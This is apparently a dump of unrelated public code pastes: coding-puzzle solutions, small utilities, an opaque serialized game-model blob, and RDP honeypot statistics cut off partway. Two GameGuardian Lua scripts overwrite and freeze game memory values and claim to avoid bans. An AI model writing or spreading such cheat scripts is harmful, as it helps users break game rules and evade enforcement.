            term.setBackgroundColor(colors.black)  -- Reset background
            term.setTextColor(colors.white)        -- Reset text color
            paintutils.drawPixel(x, y, color)
            
            term.setCursorPos(x, y)
            -- Use term.write instead of print for markers
            if char == """" then
                if block.y > 0 then
                    term.write(""+"")
                elseif block.y < 0 then
                    term.write(""-"")
                else
                    term.write(""="")
                end
            else
                term.write(char)
            end
        end
    end

    -- Draw player marker
    term.setBackgroundColor(colors.black)
    term.setTextColor(colors.white)
    term.setCursorPos(centerX, centerY)
    term.write(""X"") -- Player marker

    -- Reset screen colors
    term.setBackgroundColor(colors.black)
    term.setCursorPos(1, height)
    sleep(1)  -- Wait before the next scan
    ::continue::
end"
iESpqXcx,Untitled,thewitchking,Java,Tuesday 25th of March 2025 03:20:23 AM CDT,"class Solution {
    public int minEatingSpeed(int[] piles, int h) {
        int left = 1;
        int right = 1000000000;
        
        while(left <= right){
            int mid = left + (right - left) / 2;
            if(canEatInTime(piles, mid, h)) right = mid - 1;
            else left = mid + 1;
        }
        return left;
    }
    public boolean canEatInTime(int piles[], int k, int h){
        int hours = 0;
        for(int pile : piles){
            int div = pile / k;
            hours += div;
            if(pile % k != 0) hours++;
        }
        return hours <= h;
    }
}"
VSf0Q3MU,Untitled,thewitchking,Java,Tuesday 25th of March 2025 03:10:58 AM CDT,"class Solution {
    public boolean wordBreak(String s, List<String> wordDict) {
        
        Set<String> allWords=new HashSet<>(wordDict);
        int n=wordDict.size();
        int m=s.length();
        boolean [] dp=new boolean[m+1];
        dp[0]=true;
        for(int i=1;i<=m;++i){
            for(int j=0;j<i;++j){
                if(dp[j] && allWords.contains(s.substring(j,i))){
                    dp[i]=true;
                    break;
                }
            }
        }
        return dp[m];
    }
}"
xEJy4N4w,LPF,poosh,UnrealScript,Tuesday 25th of March 2025 03:02:32 AM CDT,"/** 
 * @brief Applies a Low-Pass Filter to the input samples, adding inertia to the system.
 * @param y [in] previous/initial result of the function
 *          [out] new result
 * @param x new sample value
 * @oaram dt time between the previous and the new sample
 * @param rc time constant - the reference measurement time.
 *  The higher rc, the more inertia (less impact of a single x on y)
 */
static function lpf(out float y, float x, float dt, float rc)
{
    local float a;

    a = dt / (rc + dt);
    y = a * x + (1 - a) * y;
}
"
ZLw8w3H1,spooder,chrismadsen07,Lua,Tuesday 25th of March 2025 02:57:54 AM CDT,"3,2764|[[{!  A I i!% : [ 0 ,!, - 1 . 5!-!3 1 ,!5!,!8!6!- ] ,!% c - > > 4 m < < I k!)!+!3!/!1!<!% I j!I!/ , -!. 0!N A p -!)!,!O m!I!9 1!X n!@ > 2!E I l!a!:!W < >!>!f 4 I!E H 5!]!= A H K!l 9!8!X!Z!)!5!% H L!R 5!1 3 8!2 6 . 7 7 2 4!T 5 3 . 8 1 9 6!d!f 3!u U!I 1#* 7 8 3!6!0 9 4!2 1#7 7#M!X H Y!x#& 9!a .#, 8 2!-#X#2!2 0#X 8 4 3#Q S!}# !y H M!] . 4!o!% L F!A r b x a s s e t i d : / / 2 5#M 0 3 5 0$'!E## A :#[#q H!)$0 A!e!A#o <!?$7 _!%#p A#r#t#v#x#z#|#~$!#c 4 9 3 0$% 1$8$-$/!y L$2$. 1!^$5!f 5!E$:!B$< A$>$@ >#u#w#y#{#}$ $#$%$K$($*#? <$P$4$S#$$W$6 > 6$[!r$_$> M#S$.!2!q!A 5 N$,![$.$4 M b$A$e$D$h$!$V 3$I 9%5 8 8 0!E$v 7!E M W%-$C$g$F /%2%4%6 1 6$=!p A$] 5$Z < a%( :!$ A _ _ I S E X E C U T A B L E!) f a l#z!y%V E N%a%c D!) t r u e%j _ S C R I P T T Y P E!A L o c%g S c r i p t!% }!y$P#%$X!A 8!E L j!A - - M a d e   b y   L u c k y m a x e r!  { n&O n M o u#z%W c o n   =  &O!%$d%A t$i t e x t u r e s / G u n C&j s o r . p n g&` A&R R e l o&> i&y&X&Z&]&_%T&b$f&d$!&f&h&j&l&n&p W a i t&r r&t&v&x&z%T&R&R T o o l') s&*&, t . P a&k n&.&P&R&T&V&@&^ n i!k'R&P f&p c#|'( U p d a&f I&Y n ( )'A {#| f  'T#z   t h e&Q'['Q t'r e .'h'(&^'C'E . E n a b l e d   a n(-'|''&[&u  &~'!'$'&( 'x'x&f(0&R'w d'm n'^ n'` i'( O n E q u&, p(, (($ l'|'l'y'|')(S'|'m t'c'e'g'i'k(@(?'[(D'_'a&[(J C h(/ g(Q P r o(P r t y(V(= i'p(q(s&M(v&]&^&{('()(+(B%T't'v(<&O'z(_'f e(;(c'y(A(d)((<(S(&(M(O(, : C&Z n e'` ((J(L(N p(P d(x)9(l(n)=)? n)A)C(k(m&y(,(x%J%# >%N!E%Q!)%T%V%X%Z%]%_%n%d$.%f%h%u!%%k%m%b E%p$.%r%t%v%x%z%|%~&!!A&)&+&-&/&1%R&3$v 9&7&9 >(S'G'I&-'L'N'w'Q n H(/ d(+(Y'D l :'6'8 F&u(l'Y d (&{*4(0(+&{)X'](h(H&[ C&k)0 ((v*I%r#{&j&[(E(G&Z ((` a*S)-'!&''F o b j') I n s t(/ c'})A w*Q(w(])- f(5 k ,   v  '%   p'7';*['f*^   d o*s'n)-(z't y(P ( k ))!   ' n u m b&M ')*'w+)'z)- v*/'O t')*d!Q'y)-)-' #z+>+I'n+F [ k ]') v+M'n)5+H+W(e(=)-&k&i r(4*e(]+X)A+[&R*a%g   B#x e U r'F)#'+$B'-%0 /&{(C P l a y&M s') g a m e : G#{ S&M v i*m*C%T+z+|+~*H&R D e b&+, &^,#,%,',),+,- e,/!%,6,8 i s,4&P R&p,* r,,*m,!,$,&,( t,M,O,B&{,K n,V,A,I(< D,$ a(o V%g%t,:  !$'y+l#z,a&J(o')%!'y S+{ s h,n,c'V  $V!='y&E)V,x,p&^$K&R }(C&;*> r(6#C(. v+$';&R$5 i&J(i,h,j(= R#C,t#x h,q 2 2 6$($%#4(]-; 5- -$   5-A-C 8 7 6 7-'(C-#,z-V,e l,g .,l e-V(C G)~-8(]'c') C F r,R .*o (!,  -o!L 7$*-t$L*x-o-o!5,{-w-|-p*x-z 0 ),}(= O u+D&^-h-j,%-l e*p-x*x-r-u$*!2-~-{.7-z!U-}.1  !/(x-((f S&U(0-d,s,u-?&^*E*6,&*< t-+*@ l*B&{ S w&u d-=,v*H.%)--J,z.K(+*;'7.O*? h*A,C A.U.W._.[-e*i'v'f.I  .a.M.d.P.g.R.i U.p e.r,_.A)8*9)F)<(-&^)j+L(f-*(5 O,%,#(6'7 n b o w   K+$(()*+7 b(('Y't o+&,G p+{&C a  '!+D o'p*~(u,-(+ s .&R*u-, i*x*z*|*~ i+!.u,>'9.y d'O'k+2+'(]+, v : I s A.i'M/O c(+ E m'8&f&N%T+2'u+=+Y t+A R)0') 2 0+d+[+e'B*9 .-b&,')0- p/R'c0*(%)%(*(,'))t e(C*X(i  /l T.~ m&=&f (,1+} r-z0G&M 2*S+_*V  0F/F&M 1(.(0  0K r 20V(- n o+D0Y!0 N e.(-j'F*5  0_0a0S0Z .0d0f+j0i0b .0A,$)?'!-, =&^0Y 20u0B0x&u(x0)*J(F0> T,c H+7(/ o#} ( h1-0_#}*x/E,2 r*S+i'F*N.~ t&u _1* g*g*i*k(F*n./.i O*e)B t-Y%t,_)-1='f1@1B0o,R')&{&*1>&u+x'y1S1? r1A,c .1O,z170H(],E,9 : A d d I&f m (1a1U,c*x0M(]1v1c1V/p*1')12&J14)71&(g1(*L  .|*k g1,2%1/*B2$1.#}*S/U*{/X*{&[/[+!242&/`.Q/c'w/e+&+(/}/i/k/m1J1L'`1g*H0]*y1W,%+31Z*O1b&{+<),+*2]/~ :,6*j(r y)3+]+Z)7+J0(+g1'*Y&[ B'!*p H'8*S+,0k.t'8  (52v2r'K2 'P2y-,2v(l)B k I f A l i v,B+22z0`  (S/&)H08/{2['z0O+a0'2h'n1;(6 i g h t A r m-g(m-j'`&M : F'% d3N';/a.h,Y3A3C  3E!`/y3!  )M3J/w3M3O3Q*j2B.i R3V t.K1Q'n2u313h3B3D3F2Z+>3:381& t3?3p3C00')3{3r m3b(03d3S.z3U3q003l'o0j3o3i3}(5 (4 00+B t 0   ~.J*5*70i44)~460U4:.t4< e/z)+3u*U3;)42k3y&&+j c3I a3K0z2w2}*0'P/h'p4Q'N4S/w+33_4_&M3t/}3v3<(]3?2?22')4]3`3L3N4%/]3e/b O f C,u s.i2025)(!%2t'p2v4k#}3]5% d . H.~ l'u+348374I+`3w4M3?1i4d0|0m s/`0Y-i o m4b4T (4n4c194Z*}0m2Q (570z59184G/|2f*T534h'y2-1+1322115Y26(]1B4|2&5[21150X0m*S5( :1* k-_,b(o (-V(V*22(/T*K'( A t*k&G2e)--V')-X,f&l ..Y,w5n0;,s.D d/R6& :0G5|'y+,5a4l512H'p64#} .3p T+.'V&^('+75*5] d6<6>6; 64e5R*`4O'F-43G&^*h*j*l1H*p.T%r'% g2O/y+V3D'X m2S,z&{1?'E(/-51_6K'n6O1f6#1Y%T6&6i+N'z6l2~.)32*9+>+K e636D6;3A6=(P+36A6a696E7!6G-H6J6s6L*b3X6`*8'E4$3P4s4'.S%T-H6q6]/}++'p6O7-2^6s3? T3J k')7( :&%&>6O'f*L (6O*_7C'n7F4S k6//F-n7S'z3x2i3=(>)(5s2k2)2m&D&p5o*S5~&^6!-Z6$._-`(f)-.C&p6, .._7Y+|61*27?.t6D7B'z6}5d5)6F7$0{  7&6C8&8('} R6I666j4N707A6Q1E6T..6V6p6X&y6[5 6^6l N1X+r!%6e+{6`6r7T6_-56m7o6o#q7i6)!%8B6`+B2!(#6y/}6{8%4}7  g7#6?8++67'6D8/6;-.837.3>6M71-573*:4q763R3f,Y#C.m7=84+,7A8l8L7/+j7V&G7I6D7K'# d7N(i7Q6`7]6s9%7X60.#6^7_2g5U7}'n&;!!5G3%&G3(3*3,3.8#9#'F-+,P886S1G8;.i B o d y V' &&'8 y4,)-9H'}3-*a9V')9S'`&u#7-m-y-x+2+>9Z .&J x9Z9`1M9c9M-o 4-t-w7]1l,G1n1p1r e1t9Z-w#n7]9j6v*8';2G(=3x ] ]+)(= w.d-n .1z'y)93}&^00/R.'9: t:0'8:2 6*S:6)~0/-c .037s'n7l  7n-[6&7r+f3= n)906)'09%s6) n L#x3D5y7W')0&(f0=2+%L#|-0&f*B5!4.+D:T((07(-30:m/%);35:q3#319?3'3)3+3-'k9E'n4g4L7a:n)&08/)%g/+(=7E,-7H&^,Z,]*m6%&f:v ::> t7|+,(R;/.>&D:]5x5z7H ` < `-p:35P38.^8S7|6{+>;B7W;N4M:[*j;Q9&(#;/(]&;;9:2 57k6(6 6(1g/R-^:P9F  6&870Q(S754&8w7:-<.H2P(51a,X%T9,*L*H-96s8D2T8F A7;;t%T.]2^;z&Z I/(+k+m+o'F . .8p-6*L/R<%-><('z:&8Z'E(] }7S;-8o._;l(R*9;o77;q!%-H8z5 3];w.i<*'x5 ;}2^< 6c;r-I8S&{<:)-<R<,')-^<0  <2<47O&Z<78y8S<^'n<<6x<>'y<@5_0+:U;)'t:X)60<5v*M'v9@:|9C7|3v0Q (0R182Q0Y8X3 0i5A4`=.4R4T=,+D0i7(2Q7(=4=86~5+%g5. ` >;G480i'C:(2Q=E&t=4+20i0:3/-,/*4F<z:c<|8+:u)I7|=/58<p l=4(]0Y')0Y5;,T5=(r5@=2/w1u=h&M*S=7.*=k r<H8v4u4w4y4{6D4,=H/B=o4^4T=r4t3T%T=z;u-,=Y=q8t;p/b=w8.'D t/p'Q8A625#:y<~:{9B:~;J52*V5U(=33=V<w0:(]7u.E:G.}.r7z2d1%7e:d'b)A>A:j<t(%:7  :9:G p>S l34)I')=P=R/$(%:f3,)0#~)P)R;:>d:h)W04=]>])O)@1M (>p)J>n>G e>Q)>>r)C.|>y)G)I*I&q>|0>4;*F'}'C&F'v>g?& (2o/6'l A }!<%T 9)|.V r.X*- t!E 8!A'|(;!E 3!A.u!E 2!A s p'D&? r!E 5!A.|,v1> h!E 4?9.W6&!E 7?A&l?V < 6?Y?;.m?4 ]"
YF4YCWQr,conditional parameter api call flutter,muhaiminurabir,Dart,Tuesday 25th of March 2025 12:55:48 AM CDT," Future getUserDashboard(
    String status,
    String farmType,
    String farmCategory,
    String dateRange,
  ) async {
    try {
      Map<String, String> params;
      if (dateRange.isNotEmpty) {
        params = {
          ""status"": status,
          ""farm_type"": farmType,
          ""farm_category"": farmCategory,
          ""date_range"": dateRange,
        };
      } else {
        params = {
          ""status"": status,
          ""farm_type"": farmType,
          ""farm_category"": farmCategory,
        };
      }
      final response = await getDio()!.get(
        ApiUrl.homeUserDashboard,
        queryParameters: params,
      );
      _userDashboardResponse = UserDashboaredResponse.fromJson(response.data);
      notifyListeners();
    } on DioException catch (e) {
      _resMessage = e.message.toString();
      Log().printError(_resMessage);
      notifyListeners();
      Log().showMessageToast(message: AppInterceptors.handleError(e));
    }
  }"
vPSJnXUy,Monte_Carlo_integration_volume_of_n-ball,phy_bunny,Python,Tuesday 25th of March 2025 12:38:59 AM CDT,"import numpy as np
import matplotlib.pyplot as plt
from scipy.special import gamma
import time

# ========== 计算函数 ==========
def monte_carlo_hypersphere_volume(dim, num_samples):
    """"""蒙特卡洛体积计算函数""""""
    points = np.random.uniform(-1, 1, (num_samples, dim))
    r_squared = np.sum(points**2, axis=1)
    count = np.sum(r_squared <= 1.0)
    return 2**dim * count / num_samples  # 立方体体积 × 内点比例

def theoretical_volume(dim):
    """"""理论体积公式""""""
    return (np.pi ** (dim/2)) / gamma(1 + dim/2)

# ========== 计算参数 ==========
dims = np.arange(1, 11)   # 1-10维测试（更高维度需要极大样本）
num_samples = 10**6       # 每个维度采样数
mc_volumes = []           # 蒙特卡洛结果容器
true_volumes = []         # 理论值容器
durations = []            # 耗时监测

# ========== 执行计算 ==========
print(f""开始执行蒙特卡洛采样（维度 1-10，每维 {num_samples} 样本）"")
for d in dims:
    start_time = time.time()
    
    # 计算理论与蒙特卡洛体积
    true_vol = theoretical_volume(d)
    est_vol = monte_carlo_hypersphere_volume(d, num_samples)
    
    # 记录结果
    true_volumes.append(true_vol)
    mc_volumes.append(est_vol)
    durations.append(time.time() - start_time)
    
    print(f""维度 {d:2d} | 理论值: {true_vol:.4f} | 蒙特卡洛: {est_vol:.4f} | 耗时: {durations[-1]:.2f}s"")

# ========== 绘制结果 ==========
plt.figure(figsize=(10, 6))

# 理论值曲线（蓝色实线）
plt.plot(dims, true_volumes, 'b-o', linewidth=2, markersize=8, 
         markerfacecolor='white', label='理论值')

# 蒙特卡洛结果（红色虚线）
plt.plot(dims, mc_volumes, 'r--s', linewidth=1.5, markersize=7,
         markerfacecolor='white', label='蒙特卡洛估计')

# 可视化装饰
plt.title(""高维超球体积随维度变化"", fontsize=14, pad=20)
plt.xlabel(""维度 $d$"", fontsize=12)
plt.ylabel(""单位超球体积"", fontsize=12)
plt.xticks(dims)
plt.yscale('log')  # 对数坐标展示指数衰减
plt.grid(True, which='both', linestyle='--', alpha=0.6)
plt.legend()
plt.tight_layout()

# 添加统计数据表
stats_text = (f""蒙特卡洛参数:\n""
             f""- 采样点/维度: {num_samples}\n""
             f""- 总耗时: {sum(durations):.1f}s\n""
             f""- 最大误差: {np.max(np.abs(np.array(mc_volumes)-np.array(true_volumes))/np.array(true_volumes))*100:.1f}%"")
plt.gcf().text(0.72, 0.65, stats_text, fontsize=9, 
               bbox=dict(facecolor='white', alpha=0.8))

plt.show()
"
sSz2Rec2,Untitled,Muu2736,Lua,Tuesday 25th of March 2025 12:05:30 AM CDT,"-- Script generated by GameGuardian 101.1
-- Lua help: http://gameguardian.net/help/

local scriptName = [=====[👑  PRO ปั้ม BY เซียน    ➡️  1 เมษา 2025]=====]
local scriptVersion = '1.0.0'
local scriptAuthor = 'User'

-- วันหมดอายุ
local expirationDate = os.time({year=2025, month=4, day=1}) -- วันที่หมดอายุ: 31 มีนาคม 2025
local currentDate = os.time()

-- เช็ควันหมดอายุ
if currentDate > expirationDate then
    gg.alert(""🙏วันใช้งานหมด🙏 กรุณาติดต่อ🧑‍✈️ FB เซียน ประวีน"")
    os.exit()
end

-- init
gg.require('101.1', 16142)
gg.toast(scriptName..' v'..scriptVersion..' by '..scriptAuthor)

-- Function to perform the main action
function mainAction()
    gg.clearResults()
    gg.searchNumber(""h0100000012CA9A3BFF"", gg.TYPE_BYTE, false, gg.SIGN_EQUAL, 0, -1, 0)

    local results = gg.getResults(100)
    for i, v in ipairs(results) do
        if v.flags == gg.TYPE_BYTE then
            v.value = ""h3300000012CA9A3BFF""
            v.freeze = true
        end
    end
    gg.addListItems(results)
    gg.processResume()
    gg.toast(""👑 RUN ออโต้กันแบน BY เซียน"")
end

-- Menu function (ไม่ต้องวนลูป)
local options = {
    ""💵 เด้งแพค ปั้มยุทธ์ BY เซียน"",
    ""🚪 Exit""
}

local choice = gg.choice(options, nil, scriptName)
if choice == 1 then
    mainAction()
elseif choice == 2 then
    gg.alert(""📣 ปั้มแค่นี้ พอหรอครับ😁"")
end"
naXeezkm,osCode,Vedantm0re,Python,Monday 24th of March 2025 09:35:30 PM CDT,"import threading
import random
import time

class SharedBuffer:
    def __init__(self, size):
        self.buffer = [None] * size
        self.size = size
        self.mutex = threading.Lock()
        self.empty_slots = threading.Semaphore(size)
        self.full_slots = threading.Semaphore(0)

    def produce(self, item):
        self.empty_slots.acquire()
        self.mutex.acquire()
        self.buffer.append(item)
        print(f""Produced: {item}"")
        self.mutex.release()
        self.full_slots.release()

    def consume(self):
        self.full_slots.acquire()
        self.mutex.acquire()
        item = self.buffer.pop(0)
        print(f""Consumed: {item}"")
        self.mutex.release()
        self.empty_slots.release()
        return item

def producer(shared_buffer):
    for _ in range(10):
        item = random.randint(1, 100)
        shared_buffer.produce(item)
        time.sleep(random.uniform(0.1, 0.5))

def consumer(shared_buffer):
    for _ in range(10):
        shared_buffer.consume()
        time.sleep(random.uniform(0.1, 0.5))

if __name__ == ""__main__"":
    buffer_size = 5
    shared_buffer = SharedBuffer(buffer_size)

    producer_thread = threading.Thread(target=producer, args=(shared_buffer,))
    consumer_thread = threading.Thread(target=consumer, args=(shared_buffer,))

    producer_thread.start()
    consumer_thread.start()

    producer_thread.join()
    consumer_thread.join()

    print(""Done"")"
0c2n4ntn,Untitled,Muu2736,Lua,Monday 24th of March 2025 08:24:50 PM CDT,"-- Script generated by GameGuardian 101.1
-- Lua help: http://gameguardian.net/help/

local scriptName = [=====[👑  PRO ปั้ม BY เซียน]=====]
local scriptVersion = '1.0.0'
local scriptAuthor = 'User'

-- วันหมดอายุ
local expirationDate = os.time({year=2025, month=3, day=30}) -- วันที่หมดอายุ: 30 มีนาคม 2025
local currentDate = os.time()

-- เช็ควันหมดอายุ
if currentDate > expirationDate then
    gg.alert(""วันใช้งานหมด กรุณาติดต่อ FB เซียน ประวีน"")
    os.exit()
end

-- init
gg.require('101.1', 16142)
gg.toast(scriptName..' v'..scriptVersion..' by '..scriptAuthor)

-- Function to perform the main action
function mainAction()
    gg.clearResults()
    gg.searchNumber(""h0100000012CA9A3BFF"", gg.TYPE_BYTE, false, gg.SIGN_EQUAL, 0, -1, 0)

    local results = gg.getResults(100)
    for i, v in ipairs(results) do
        if v.flags == gg.TYPE_BYTE then
            v.value = ""h3300000012CA9A3BFF""
            v.freeze = true
        end
    end
    gg.addListItems(results)
    gg.processResume(100)
    gg.toast(""👑 RUN ออโต้กันแบน BY เซียน"")
    gg.sleep(500)
end

-- Menu function (ไม่ต้องวนลูป)
local options = {
    ""💵     เด้งแพค LV1 ปั้มยุทธ์"",
  ""🔴     2T รีสอต""
}

local choice = gg.choice(options, nil, scriptName)
if choice == 1 then
    mainAction()
elseif choice == 2 then
    gg.alert(""📣 กำลังอัพเดต เกมพึ่งอัพเดตไป ครับหัวหน้าใจเยสๆๆนะครับ"")
end"
j0wukZBj,CF1879D,pb_jiang,C++,Monday 24th of March 2025 07:36:45 PM CDT,"// Problem: D. Sum of XOR Functions
// Contest: Codeforces - Educational Codeforces Round 155 (Rated for Div. 2)
// URL: https://codeforces.com/problemset/problem/1879/D
// Memory Limit: 256 MB
// Time Limit: 2000 ms
//
// Powered by CP Editor (https://cpeditor.org)

#include <assert.h>
#include <bits/stdc++.h>
using namespace std;
#ifndef __DEBUG__
#define dbg(...) 42
#endif
template <class T> using mpq = priority_queue<T, vector<T>, greater<T>>;

using ll = long long;
using a2l = array<ll, 2>;
using pll = pair<ll, ll>;
using vl = vector<ll>;

constexpr ll mod = 998244353;

void solve_edt()
{
    ll n, ans = 0;
    cin >> n;
    vl a(n);
    for (auto &x : a)
        cin >> x;

    /*
    for (ll i = 1; i < n; ++i)
        a[i] ^= a[i - 1];
    */

    auto count_bit = [&](ll b) {
        ll ret = 0;
        ll sum[2] = {0, 0}, cnt[2] = {1, 0};
        for (ll i = 0, acc = 0; i < n; ++i) {
            ll v = a[i] >> b & 1;
            // ll flag = acc % 2;
            ll pf = acc % 2;
            acc = acc + v;
            ll flag = acc % 2;
            // ll d = (i + 1) * (cnt[1 - flag] + v) - sum[1 - flag];
            ll d = (i + 1) * cnt[1 - flag] - sum[1 - flag];
            dbg(flag, v, d);
            dbg(i + 1, cnt[1 - flag], sum[1 - flag]);
            // sum[flag] += i + 1, cnt[flag] += 1;
            sum[flag] += i + 1, cnt[flag] += 1;
            // sum[pf] += i, cnt[pf] += 1;
            dbg(d);
            ret = (ret + d) % mod;
        }
        return (ret << b) % mod;
    };

    for (ll i = 0; i < 31; ++i)
        ans = (ans + count_bit(i)) % mod;
    cout << ans << '\n';
}

void solve()
{
    ll n, ans = 0;
    cin >> n;
    vl a(n);
    for (auto &x : a)
        cin >> x;

    auto count_bit = [&](ll b) {
        ll ret = 0;
        vl acc(n), oc(n), ec(n), os(n), es(n);
        for (ll i = 0; i < n; ++i) {
            ll c = (a[i] >> b) & 1;
            acc[i] = c + (i > 0 ? acc[i - 1] : 0);
        }
        for (ll i = n - 1; i >= 0; --i) {
            ll v = acc[i] % 2;
            oc[i] = (i < n - 1 ? oc[i + 1] : 0) + v;
            ec[i] = (i < n - 1 ? ec[i + 1] : 0) + 1 - v;
            os[i] = (i < n - 1 ? os[i + 1] : 0) + (v ? i : 0);
            es[i] = (i < n - 1 ? es[i + 1] : 0) + (1 - v ? i : 0);
        }
        for (ll i = 0, zc = 0; i < n; ++i) {
            ll flag = (a[i] >> b) & 1;
            zc += 1;
            if (flag) {
                const auto &vs = acc[i] % 2 ? os : es;
                const auto &cs = acc[i] % 2 ? oc : ec;
                auto v = vs[i] + cs[i];
                auto d = (v * zc - cs[i] * zc * (i + i - zc + 1) / 2) % mod;
                dbg(d, v, zc);
                ret = (ret + d) % mod;
                zc = 0;
            }
        }
        return (ret << b) % mod;
    };
    for (ll i = 0; i < 31; ++i)
        ans = (ans + count_bit(i)) % mod;
    cout << ans << '\n';
}

void solve_wa()
{
    ll n, ans = 0;
    cin >> n;
    vl a(n);
    for (auto &x : a)
        cin >> x;

    auto count_bit = [&](ll b) {
        ll ret = 0;
        vl acc(n), oc(n), ec(n);
        for (ll i = 0; i < n; ++i) {
            ll c = (a[i] >> b) & 1;
            acc[i] = c + (i > 0 ? acc[i - 1] : 0);
        }
        for (ll i = n - 1; i >= 0; --i) {
            ll v = acc[i] % 2;
            oc[i] = (i < n - 1 ? oc[i + 1] : 0) + v;
            ec[i] = (i < n - 1 ? ec[i + 1] : 0) + 1 - v;
        }
        for (ll i = 0, zc = 0; i < n; ++i) {
            ll flag = (a[i] >> b) & 1;
            zc += 1;
            if (flag) {
                const auto &vs = acc[i] % 2 ? oc : ec;
                auto v = vs[i];
                auto gain = v * (v + 1) / 2;
                auto gain2 = (gain + gain + v * (zc - 1)) * zc / 2;
                if (b == 1)
                    dbg(gain2);
                ret = (ret + gain2) % mod;
                zc = 0;
            }
        }
        if (b == 1) {
            dbg(acc);
            dbg(ec);
            dbg(oc);
        }
        return (ret << b) % mod;
    };
    for (ll i = 0; i < 31; ++i)
        ans = (ans + count_bit(i)) % mod;
    cout << ans << '\n';
}

int main(int argc, char **argv)
{
    solve_edt();
    return 0;
};
"
ahmk6XPj,CF1592C,pb_jiang,C++,Monday 24th of March 2025 07:30:41 PM CDT,"// Problem: C. Bakry and Partitioning
// Contest: Codeforces - Codeforces Round 746 (Div. 2)
// URL: https://codeforces.com/problemset/problem/1592/C
// Memory Limit: 256 MB
// Time Limit: 1000 ms
//
// Powered by CP Editor (https://cpeditor.org)

#include <assert.h>
#include <bits/stdc++.h>
using namespace std;
#ifndef __DEBUG__
#define dbg(...) 42
#endif
template <class T> using mpq = priority_queue<T, vector<T>, greater<T>>;

using ll = long long;
using a2l = array<ll, 2>;
using pll = pair<ll, ll>;
using vl = vector<ll>;

void solve()
{
    ll n, k;
    cin >> n >> k;
    vl a(n);
    for (auto &x : a)
        cin >> x;
    vector<vl> g(n + 1);
    for (ll i = 0, u, v; i < n - 1; ++i) {
        cin >> u >> v;
        g[u].push_back(v), g[v].push_back(u);
    }
    ll val = accumulate(a.begin(), a.end(), 0ll, [](ll x, ll y) { return x ^ y; });
    if (val == 0) {
        cout << ""YES\n"";
        return;
    }
    vl xs(n + 1);
    ll cut = 0;
    auto dfs = [&](auto &&self, ll u, ll fa) -> ll {
        ll acc = a[u - 1];
        for (auto v : g[u]) {
            if (v == fa)
                continue;
            acc = acc ^ self(self, v, u);
        }
        if (acc == val)
            acc = 0, cut += 1;
        return xs[u] = acc;
    };
    dfs(dfs, 1, -1);
    /*
    auto dfs2 = [&](auto &&self, ll u, ll fa) {
        ll sum = a[u - 1];
        for (auto v : g[u]) {
            if (v == fa)
                continue;
            if (xs[v] == val) {
                cut += 1;
                continue;
            }
            sum = sum ^ xs[v];
        }
        if (sum == 0)
            cut += 1;
        return sum;
    };
    for (ll i = 2; i <= n; ++i)
        cut += xs[i] == val;
    */
    cout << (cut >= 2 && k > 2 ? ""YES"" : ""NO"") << '\n';
}

int main(int argc, char **argv)
{
    ll t;
    cin >> t;
    while (t--)
        solve();
    return 0;
};
"
XMepR2gJ,2025-03-24_stats.json,rdp_snitch,JSON,Monday 24th of March 2025 07:18:18 PM CDT,"{
  ""ip"": {
    ""106.14.144.233"": 435,
    ""165.22.186.232"": 12,
    ""139.177.201.148"": 3,
    ""103.37.60.27"": 33,
    ""185.42.12.5"": 18,
    ""147.185.132.9"": 9,
    ""165.227.22.50"": 12,
    ""157.245.226.238"": 3,
    ""66.228.42.15"": 3,
    ""45.227.254.152"": 12,
    ""199.45.155.76"": 3,
    ""178.63.252.130"": 3,
    ""147.185.132.213"": 9,
    ""172.232.225.185"": 6,
    ""178.20.129.235"": 3,
    ""14.225.198.240"": 3,
    ""162.142.125.195"": 3,
    ""58.218.199.219"": 15,
    ""205.210.31.232"": 9,
    ""220.117.78.210"": 66,
    ""165.154.182.72"": 3,
    ""185.242.226.23"": 3,
    ""216.24.216.245"": 66,
    ""157.245.104.150"": 3,
    ""198.235.24.68"": 9
  },
  ""asn"": {
    ""AS37963"": 435,
    ""AS14061"": 30,
    ""AS63949"": 12,
    ""AS149147"": 33,
    ""AS59425"": 18,
    ""AS396982"": 36,
    ""AS267784"": 12,
    ""AS398722"": 3,
    ""AS24940"": 3,
    ""AS24810"": 3,
    ""AS135905"": 3,
    ""AS398324"": 3,
    ""AS4134"": 15,
    ""AS4766"": 66,
    ""AS135377"": 3,
    ""AS202425"": 3,
    ""AS174"": 66
  },
  ""isp"": {
    ""Hangzhou Alibaba Advertising Co"": 435,
    ""DigitalOcean, LLC"": 30,
    ""Akamai Technologies, Inc."": 12,
    ""Gofiber Software Technology Company Limited"": 33,
    ""Chang Way Technologies Co. Limited"": 18,
    ""Google LLC"": 36,
    ""Flyservers S.A."": 12,
    ""Censys, Inc."": 6,
    ""Hetzner Online GmbH"": 3,
    ""Teleset LLC Nchelny Branch"": 3,
    ""Vietnam Posts and Telecommunications Group"": 3,
    ""Chinanet"": 15,
    ""Korea Telecom"": 66,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""IP Volume inc"": 3,
    ""Ipxo LLC"": 66
  },
  ""org"": {
    ""Aliyun Computing Co., LTD"": 435,
    ""DigitalOcean, LLC"": 30,
    ""Linode"": 6,
    ""GOFIBER-SOFTWARE"": 33,
    ""Horizon LLC"": 18,
    ""Palo Alto Networks, Inc"": 36,
    ""Xwin Universal LTD"": 12,
    ""Censys, Inc."": 3,
    ""Rasoul Shamaei"": 3,
    ""Akamai Technologies, Inc."": 6,
    ""Teleset LLC"": 3,
    ""VNPT"": 3,
    ""Censys Inc"": 3,
    ""Chinanet JS"": 15,
    ""Kornet"": 66,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""AI Spera"": 3,
    ""Unknown"": 66
  },
  ""regionName"": {
    ""Shanghai"": 435,
    ""New Jersey"": 15,
    ""Georgia"": 3,
    ""Ho Chi Minh"": 33,
    ""Moscow"": 18,
    ""California"": 54,
    ""Vilnius"": 12,
    ""Kowloon"": 3,
    ""Saxony"": 3,
    ""Jakarta"": 6,
    ""Tatarstan Republic"": 3,
    ""Hanoi"": 3,
    ""Michigan"": 3,
    ""Jiangsu"": 15,
    ""Seoul"": 66,
    ""North Holland"": 3,
    ""North Rhine-Westphalia"": 66,
    ""Karnataka"": 3
  },
  ""country"": {
    ""China"": 450,
    ""United States"": 75,
    ""Vietnam"": 36,
    ""Russia"": 21,
    ""Lithuania"": 12,
    ""Hong Kong"": 3,
    ""Germany"": 69,
    ""Indonesia"": 6,
    ""South Korea"": 66,
    ""The Netherlands"": 3,
    ""India"": 3
  },
  ""account"": {
    ""hello"": 633,
    ""u6g5liub"": 12,
    ""beio"": 9,
    ""Test"": 18,
    ""FCLbxsYoI"": 3,
    ""lNqSCx"": 3,
    ""pvGnBp"": 3,
